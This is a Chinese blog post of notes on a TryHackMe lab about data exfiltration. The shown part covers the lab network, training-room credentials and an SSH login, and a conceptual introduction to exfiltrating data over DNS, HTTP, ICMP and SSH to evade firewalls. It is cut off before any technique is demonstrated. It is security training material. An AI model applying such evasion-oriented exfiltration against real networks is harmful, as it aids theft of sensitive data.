
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>THM-数据泄露 - hybcx's blog</title>

  
    <meta name="description" content="0x01 介绍 欢迎来到数据泄露 网络犯罪分子出于不同目的对公司使用各种互联网攻击。在大多数情况下，许多攻击都会导致数据泄露，威胁行为者窃取敏感数据并在暗网上出售或在线发布。 有人可能会问：威胁行为者如何将窃取的数据从公司网络转移到外部（也称为数据泄露）而不被发现？答案各不相同。威胁行为者可以执行多种技术，包括数据泄露。 数据泄露是一种非传统方法，用于将数据从受感染的计算机复制和传输到攻击者的计算">
<meta property="og:type" content="article">
<meta property="og:title" content="THM-数据泄露">
<meta property="og:url" content="http://hybcx.xyz/2024/07/20/thm-shu-ju-xie-lu/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 介绍 欢迎来到数据泄露 网络犯罪分子出于不同目的对公司使用各种互联网攻击。在大多数情况下，许多攻击都会导致数据泄露，威胁行为者窃取敏感数据并在暗网上出售或在线发布。 有人可能会问：威胁行为者如何将窃取的数据从公司网络转移到外部（也称为数据泄露）而不被发现？答案各不相同。威胁行为者可以执行多种技术，包括数据泄露。 数据泄露是一种非传统方法，用于将数据从受感染的计算机复制和传输到攻击者的计算">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009646.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009647.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009648.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009649.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009650.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009651.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009652.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009653.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009654.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009655.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009656.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009657.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009658.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009659.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009660.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009661.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009662.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009663.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009664.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009665.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009666.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009667.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009668.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009669.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009670.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009671.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009672.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009673.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009674.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009675.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009676.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009677.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009678.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009679.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009680.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009682.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009683.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009684.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009685.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009686.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009687.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009688.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009689.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009690.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009691.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009692.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009693.png">
<meta property="article:published_time" content="2024-07-20T07:24:56.000Z">
<meta property="article:modified_time" content="2024-07-24T08:32:14.541Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="tryhackme">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009646.png">
  
  
  
  <meta name="keywords" content="tryhackme">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/tryhackme/">tryhackme</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-20T07:24:56.000Z">2024-07-20</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-24T08:32:14.541Z">2024-07-24</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>THM-数据泄露</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-介绍">0x01 介绍</h1>
<h2 id="欢迎来到数据泄露">欢迎来到数据泄露</h2>
<p>网络犯罪分子出于不同目的对公司使用各种互联网攻击。在大多数情况下，许多攻击都会导致数据泄露，威胁行为者窃取敏感数据并在暗网上出售或在线发布。</p>
<p>有人可能会问：威胁行为者如何将窃取的数据从公司网络转移到外部（也称为数据泄露）而不被发现？答案各不相同。威胁行为者可以执行多种技术，包括数据泄露。</p>
<p>数据泄露是一种非传统方法，用于将数据从受感染的计算机复制和传输到攻击者的计算机。数据渗漏技术用于模拟正常的网络活动，它依赖于 DNS、HTTP、SSH 等网络协议。通过常见协议进行的数据渗漏很难检测和区分合法流量和恶意流量。</p>
<p>某些协议并非旨在通过其传输数据。然而，威胁行为者找到了滥用这些协议来绕过基于网络的安全产品（例如防火墙）的方法。作为红队成员，使用这些技术对于避免被发现至关重要。</p>
<h2 id="学习目标">学习目标</h2>
<p>该室介绍了数据泄露类型，并展示了用于通过各种协议传输数据的技术。</p>
<ul>
<li>
<p>什么是数据泄露？</p>
</li>
<li>
<p>了解数据泄露类型及其使用方式。</p>
</li>
<li>
<p>通过协议进行数据泄露：Sockets、SSH、ICMP、HTTP(s) 和 DNS。</p>
</li>
<li>
<p>通过各种协议练习 C2 通信。</p>
</li>
<li>
<p>练习通过 DNS 和 HTTP 建立隧道。</p>
</li>
</ul>
<h2 id="房间先决条件">房间先决条件</h2>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtonetworking">Introductory Networking&nbsp;&nbsp;介绍性网络</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/protocolsandservers">Protocols and Servers&nbsp;&nbsp;协议和服务器</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/dnsindetail">DNS&nbsp;in Detail&nbsp;DNS 详细信息</a></p>
</li>
<li>
<p>使用 tmux 或类似工具！ （对于单次 SSH 登录的多个会话）</p>
</li>
</ul>
<h1 id="0x02-网络基础设施">0x02 网络基础设施</h1>
<p>对于这个房间，我们构建了一个网络来模拟实际场景，我们可以使用各种网络协议执行数据泄露和隧道传输。提供的虚拟机包含两个具有多个客户端的独立网络。我们还有一台“JumpBox”机器可以访问这两个网络。下图显示了有关该房间使用的网络环境的更多信息。</p>
<p>简单拓扑图如下：<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009646.png" alt></p>
<p>在接下来的各种协议任务中，请使用网络图作为参考。我们还设置了域名 <a target="_blank" rel="noopener" href="http://thm.com">thm.com</a>，以方便在网络环境内进行通信和连接。请查看下表，了解有关该房间使用的域名和网络访问的更多信息。</p>
<table>
<thead>
<tr>
<th><strong>Domain Name</strong></th>
<th><strong>IP Address</strong></th>
<th>**Network Access&nbsp;**</th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener" href="http://jump.thm.com">jump.thm.com</a></td>
<td>192.168.0.133</td>
<td>Net 1 and Net 2</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://uploader.thm.com">uploader.thm.com</a></td>
<td>172.20.0.100</td>
<td>Net 1</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://flag.thm.com">flag.thm.com</a></td>
<td><code>***.**.*.***</code></td>
<td>Net 1</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://victim2.thm.com">victim2.thm.com</a></td>
<td>172.20.0.101</td>
<td>Net 1</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://web.thm.com">web.thm.com</a></td>
<td>192.168.0.100</td>
<td>Net 2</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://icmp.thm.com">icmp.thm.com</a></td>
<td>192.168.0.121</td>
<td>Net 2</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://victim1.thm.com">victim1.thm.com</a></td>
<td>192.168.0.101</td>
<td>Net 2</td>
</tr>
</tbody>
</table>
<h2 id="部署虚拟机">部署虚拟机！</h2>
<p>通过部署 AttackBox 或连接到 VPN，部署提供的 VM 并通过 SSH 客户端连接到它。使用以下凭据连接到可访问内部网络的 Jumpbox 计算机。</p>
<p>Machine IP:&nbsp;MACHINE_IP&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;thm&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;Password:&nbsp;tryhackme</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ssh thm<span class="hljs-keyword">@MACHINE</span>_IP</code></pre>
<p>连接到 Jumpbox 计算机后，您就可以访问这两个网络。检查网络基础设施以获取更多信息。</p>
<h2 id="实验室推荐">实验室推荐</h2>
<ul>
<li>
<p>我们建议对大多数任务（TCP、SSH、ICMP、DNS）使用 JumpBox 和网络环境，以避免 DNS 和网络出现技术问题。但是，如果您更愿意使用 AttackBox 执行 DNS 隧道任务（任务 10），则必须将 AttackBox 的 DNS 设置更改为 MACHINE_IP。有关更改 AttackBox 的 DNS 的更多信息，请检查 DNS 配置（任务 8）。</p>
</li>
<li>
<p>大多数情况下，我们需要使用两台机器建立通信。因此，我们需要两个或更多可用的 Linux 终端来完成任务。因此，我们建议使用 tmux 工具通过单个 SSH 登录创建多个会话。</p>
</li>
</ul>
<h1 id="0x03-数据泄露">0x03 数据泄露</h1>
<h2 id="什么是数据泄露">什么是数据泄露</h2>
<p>数据泄露是获取未经授权的敏感数据副本并将其从组织网络内部移动到外部的过程。值得注意的是，数据泄露是一个受损后的过程，其中威胁参与者已经获得了网络访问权限并执行了各种活动来获取敏感数据。数据泄露通常发生在网络杀伤链模型的最后阶段，即目标行动。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009647.png" alt></p>
<p>数据泄露还用于隐藏对手的恶意活动并绕过安全产品。例如，DNS 渗透技术可以逃避安全产品，例如防火墙。</p>
<p>敏感数据可以有多种类型和形式，并且可能包含以下内容：</p>
<ul>
<li>用户名和密码或任何身份验证信息。</li>
<li>银行账户详细信息</li>
<li>业务战略决策。</li>
<li>加密密钥。</li>
<li>员工和人事信息。</li>
<li>项目代码数据。</li>
</ul>
<h2 id="如何使用数据渗透">如何使用数据渗透</h2>
<p>数据泄露有三种主要用例场景，包括：</p>
<ol>
<li>Exfiltrate data&nbsp;窃取数据</li>
<li>Command and control communications.  命令和控制通信。</li>
<li>Tunneling&nbsp;隧道技术</li>
</ol>
<h3 id="传统数据泄露">传统数据泄露</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009648.png" alt></p>
<h3 id="c2-通讯">C2 通讯</h3>
